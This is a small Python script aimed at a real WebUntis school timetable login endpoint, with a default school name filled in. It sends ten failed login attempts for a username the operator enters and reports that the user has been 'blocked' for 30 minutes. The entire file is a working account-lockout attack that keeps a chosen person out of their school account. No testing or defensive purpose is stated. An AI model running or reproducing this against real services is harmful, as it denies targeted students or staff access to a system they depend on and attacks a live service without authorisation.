"""importing Modules"""
import requests

class WebUntis():
    """class"""
    def __init__(self) -> None:
        self.url = "https://aoide.webuntis.com/WebUntis/j_spring_security_check"
        self.payload = {
            'school': 'htbla-weiz',
            'j_username': 'defaultuser',
            'j_password': 'defaultpassword',
            'token': ''
        }

    def main(self):
        """sends request to server"""
        user = input("Enter a user: ")
        school = input("Enter a school (leave empty to use htlba weiz): ")
        self.payload["j_username"] = user
        if school != "":
            self.payload["school"] = school

        for _ in range(10):
            with requests.Session() as session:
                session.post(self.url, data=self.payload)
        print("successfully blocked the user for 30mins")

WebUntis().main()
